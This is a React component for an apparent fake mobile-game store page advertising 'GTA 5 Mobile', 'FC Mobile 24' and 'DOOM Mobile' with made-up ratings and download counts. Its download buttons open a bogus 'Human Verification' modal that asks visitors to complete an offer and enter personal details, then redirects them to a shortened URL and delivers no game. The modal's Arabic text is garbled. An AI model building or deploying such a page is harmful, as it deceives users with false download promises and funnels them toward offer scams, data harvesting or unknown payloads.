import { FaDownload, FaStar, FaArrowLeft, FaMoon, FaSun, FaRobot } from 'react-icons/fa';
import { IoIosPhonePortrait } from 'react-icons/io';
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import Modal from 'react-modal';

// Import des images principales
import fcMobileImage from './assets/FcMobile/FcMobile.png';
import gta5Image from './assets/gta5/gta5.jpeg';
import doomImage from './assets/Doom/doom.webp';

// Import des captures d'écran pour FC Mobile
import fcMobileScreen1 from './assets/FcMobile/screen1.webp';
import fcMobileScreen2 from './assets/FcMobile/screen2.webp';
import fcMobileScreen3 from './assets/FcMobile/screen3.webp';
import fcMobileScreen4 from './assets/FcMobile/screen4.webp';

// Import des captures d'écran pour GTA 5
import gta5Screen1 from './assets/gta5/screen1.jpg';
import gta5Screen2 from './assets/gta5/screen2.jpg';
import gta5Screen3 from './assets/gta5/screen3.jpg';
import gta5Screen4 from './assets/gta5/screen4.jpg';

// Import des captures d'écran pour Doom
import doomScreen1 from './assets/Doom/screen1.webp';
import doomScreen2 from './assets/Doom/screen2.webp';
import doomScreen3 from './assets/Doom/screen3.webp';
import doomScreen4 from './assets/Doom/screen4.webp';
import doomScreen5 from './assets/Doom/screen5.webp';
import doomScreen6 from './assets/Doom/screen6.webp';
import doomScreen7 from './assets/Doom/screen7.webp';

Modal.setAppElement('#root');

const GameDetail = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [darkMode, setDarkMode] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [showVerification, setShowVerification] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    setDarkMode(prefersDark);
    
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  const toggleDarkMode = () => {
    setDarkMode(!darkMode);
  };

  const handleDownloadClick = () => {
    setShowVerification(true);
  };

  const closeModal = () => {
    window.location.href = "https://smrturl.co/bbdafba";
  };

  // Game data with imported images
  const games = {
    1: {
      title: "FC Mobile 24",
      version: "4.49.45",
      latest: "2.41",
      size: "1.2GB",
      rating: 4.5,
      downloads: "10M+",
      platforms: ["ANDROID", "IOS"],
      image: fcMobileImage,
      screenshots: [
        fcMobileScreen1,
        fcMobileScreen2,
        fcMobileScreen3,
        fcMobileScreen4
      ],
      description: "The ultimate football experience on mobile with enhanced graphics and gameplay. Featuring all your favorite teams and players with realistic animations and controls optimized for mobile devices.",
      features: [
        "Realistic player movements and animations",
        "All official leagues and teams",
        "Customizable controls",
        "Online multiplayer mode",
        "Regular updates with new content"
      ],
      requirements: {
        android: "Android 8.0 or later",
        ios: "iOS 12.0 or later",
        storage: "2GB available space",
        ram: "2GB RAM minimum"
      }
    },
    2: {
      title: "GTA 5 Mobile",
      version: "6.40.779",
      latest: "3.21",
      size: "2.5GB",
      rating: 4.8,
      downloads: "50M+",
      platforms: ["ANDROID", "IOS"],
      image: gta5Image,
      screenshots: [
        gta5Screen1,
        gta5Screen2,
        gta5Screen3,
        gta5Screen4
      ],
      description: "Explore Los Santos on your mobile device with this optimized version of the classic game. Experience the full story mode and open-world gameplay with enhanced mobile controls.",
      features: [
        "Complete story mode",
        "Open world exploration",
        "Enhanced mobile controls",
        "Multiplayer mode",
        "Regular content updates"
      ],
      requirements: {
        android: "Android 9.0 or later",
        ios: "Not available",
        storage: "3GB available space",
        ram: "3GB RAM minimum"
      }
    },
    3: {
      title: "DOOM Mobile",
      version: "3.20.1",
      latest: "1.20.1",
      size: "50 MB",
      rating: 4.7,
      downloads: "200M+",
      platforms: ["ANDROID", "IOS"],
      image: doomImage,
      screenshots: [
        doomScreen1,
        doomScreen2,
        doomScreen3,
        doomScreen4,
        doomScreen5,
        doomScreen6,
        doomScreen7
      ],
      description: "The legendary DOOM experience optimized for mobile devices. Fight through hordes of demons with intense action and smooth performance on your phone or tablet.",
      features: [
        "Classic DOOM gameplay",
        "Optimized touch controls",
        "Multiple campaigns",
        "Online leaderboards",
        "Controller support"
      ],
      requirements: {
        android: "Android 10.0 or later",
        ios: "iOS 13.0 or later",
        storage: "2GB available space",
        ram: "4GB RAM recommended"
      }
    }
  };

  const game = games[id] || games[1];

  return (
    <div className={`min-h-screen transition-colors duration-300 ${darkMode ? 'bg-gray-900 text-gray-100' : 'bg-gray-100 text-gray-900'}`}>
      {/* Header */}
      <header className={`${darkMode ? 'bg-gray-800' : 'bg-indigo-900'} text-white p-4 shadow-lg sticky top-0 z-50`}>
        <div className="container mx-auto flex justify-between items-center">
          <button 
            onClick={() => navigate(-1)}
            className="flex items-center space-x-2 hover:text-indigo-200"
          >
            <FaArrowLeft />
            <span>Back to Store</span>
          </button>
          
          <button 
            onClick={toggleDarkMode}
            className="p-2 rounded-full focus:outline-none"
            aria-label="Toggle dark mode"
          >
            {darkMode ? <FaSun className="text-yellow-300" /> : <FaMoon />}
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto py-8 px-4">
        <div className="flex flex-col lg:flex-row gap-8">
          {/* Left Column */}
          <div className="lg:w-2/3">
            {/* Game Title and Basic Info */}
            <div className="flex flex-col md:flex-row gap-6 mb-8">
              <div className="w-full md:w-1/3 lg:w-1/4">
                <img 
                  src={game.image} 
                  alt={game.title} 
                  className="w-full rounded-xl shadow-md"
                />
              </div>
              <div className="flex-1">
                <h1 className="text-2xl md:text-3xl font-bold mb-2">{game.title}</h1>
                <div className="flex items-center mb-4">
                  <div className="flex items-center bg-indigo-100 text-indigo-800 px-3 py-1 rounded-md mr-4">
                    <FaStar className="mr-1 text-yellow-500" />
                    {game.rating}
                  </div>
                  <span className={`${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>{game.downloads} downloads</span>
                </div>
                
                <div className="mb-4">
                  <h3 className="text-lg font-semibold mb-2">About</h3>
                  <p className={`${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>{game.description}</p>
                </div>
                
                <div className="flex flex-wrap gap-2 mb-4">
                  {game.platforms.map((platform, index) => (
                    <span 
                      key={index} 
                      className={`px-3 py-1 rounded-full text-sm ${darkMode ? 'bg-gray-700 text-gray-300' : 'bg-gray-200 text-gray-800'}`}
                    >
                      {platform}
                    </span>
                  ))}
                </div>
                
                <button 
                  onClick={handleDownloadClick}
                  className={`${darkMode ? 'bg-indigo-700 hover:bg-indigo-600' : 'bg-indigo-600 hover:bg-indigo-700'} text-white px-6 py-3 rounded-lg font-medium flex items-center transition`}
                >
                  <FaDownload className="mr-2" />
                  Download ({game.size})
                </button>
              </div>
            </div>
            
            {/* Screenshots */}
            <div className="mb-8">
              <h2 className="text-xl font-bold mb-4">Screenshots</h2>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                {game.screenshots.map((screenshot, index) => (
                  <div key={index} className="rounded-lg overflow-hidden shadow-md">
                    <img 
                      src={screenshot} 
                      alt={`Screenshot ${index + 1}`} 
                      className="w-full h-full object-cover cursor-pointer hover:opacity-90 transition"
                    />
                  </div>
                ))}
              </div>
            </div>
            
            {/* Features */}
            <div className="mb-8">
              <h2 className="text-xl font-bold mb-4">Features</h2>
              <ul className={`${darkMode ? 'text-gray-300' : 'text-gray-700'} space-y-2`}>
                {game.features.map((feature, index) => (
                  <li key={index} className="flex items-start">
                    <span className="text-indigo-500 mr-2">•</span>
                    {feature}
                  </li>
                ))}
              </ul>
            </div>
          </div>
          
          {/* Right Column */}
          <div className="lg:w-1/3">
            <div className={`${darkMode ? 'bg-gray-800' : 'bg-white'} rounded-xl shadow-md p-6 sticky top-24`}>
              <h2 className="text-xl font-bold mb-4">Game Information</h2>
              
              <div className="space-y-4">
                <div>
                  <h3 className={`${darkMode ? 'text-gray-400' : 'text-gray-600'} text-sm font-semibold mb-1`}>Version</h3>
                  <p>{game.version}</p>
                </div>
                
                <div>
                  <h3 className={`${darkMode ? 'text-gray-400' : 'text-gray-600'} text-sm font-semibold mb-1`}>Last Updated</h3>
                  <p>{id === '1' ? 'May 15, 2023' : id === '2' ? 'April 20, 2023' : 'June 5, 2023'}</p>
                </div>
                
                <div>
                  <h3 className={`${darkMode ? 'text-gray-400' : 'text-gray-600'} text-sm font-semibold mb-1`}>Requirements</h3>
                  <div className="mt-2 space-y-2">
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Android:</span>
                      <span>{game.requirements.android}</span>
                    </div>
                    {game.requirements.ios !== "Not available" && (
                      <div className="flex justify-between">
                        <span className={`${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>iOS:</span>
                        <span>{game.requirements.ios}</span>
                      </div>
                    )}
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Storage:</span>
                      <span>{game.requirements.storage}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>RAM:</span>
                      <span>{game.requirements.ram}</span>
                    </div>
                  </div>
                </div>
                
                <div className="pt-4 border-t border-gray-200 dark:border-gray-700">
                  <button 
                    onClick={handleDownloadClick}
                    className={`w-full ${darkMode ? 'bg-indigo-700 hover:bg-indigo-600' : 'bg-indigo-600 hover:bg-indigo-700'} text-white py-3 rounded-lg font-medium transition flex items-center justify-center`}
                  >
                    <IoIosPhonePortrait className="mr-2" />
                    Install on Another Device
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Human Verification Modal */}
      <Modal
        isOpen={showVerification}
        onRequestClose={closeModal}
        contentLabel="Human Verification"
        className={`fixed inset-0 flex items-center justify-center p-4 ${darkMode ? 'dark' : ''}`}
        overlayClassName="fixed inset-0 bg-black bg-opacity-50"
      >
        <div className={`w-full max-w-md rounded-lg shadow-xl p-6 ${darkMode ? 'bg-gray-800 text-white' : 'bg-white text-gray-900'}`}>
          <div className="flex justify-center mb-4">
            <div className={`p-3 rounded-full ${darkMode ? 'bg-gray-700' : 'bg-blue-100'}`}>
              <FaRobot className="text-4xl text-blue-500" />
            </div>
          </div>
          
          <h2 className="text-2xl font-bold mb-4 text-center">Human Verification</h2>
          <p className="mb-4 text-center">Complete one offer below to download {game.title}</p>
          
          <div className={`p-4 mb-4 rounded-lg ${darkMode ? 'bg-gray-700' : 'bg-blue-50'} border ${darkMode ? 'border-gray-600' : 'border-blue-200'}`}>
            <h3 className="font-bold mb-2">Enter Your Details to Have a Chance to Open Mystery Box Now!</h3>
            <p className="text-sm mb-4">أدخل رقم التربية الشخصي الخاص به لمشاهدة متعلق النهير</p>
            <button className={`w-full py-2 rounded-lg font-medium ${darkMode ? 'bg-indigo-700 hover:bg-indigo-600' : 'bg-indigo-600 hover:bg-indigo-700'} text-white`}>
              إلنجبية الآن
            </button>
          </div>
          
          <p className="text-center mb-4 text-red-600">Waiting for verification...</p>
          
          <button 
            onClick={closeModal}
            className={`w-full py-3 rounded-lg font-bold ${darkMode ? 'bg-green-700 hover:bg-green-600' : 'bg-green-600 hover:bg-green-700'} text-white flex items-center justify-center`}
          >
            <FaDownload className="mr-2" />
            Click Here To Download
          </button>
        </div>
      </Modal>
    </div>
  );
};

export default GameDetail;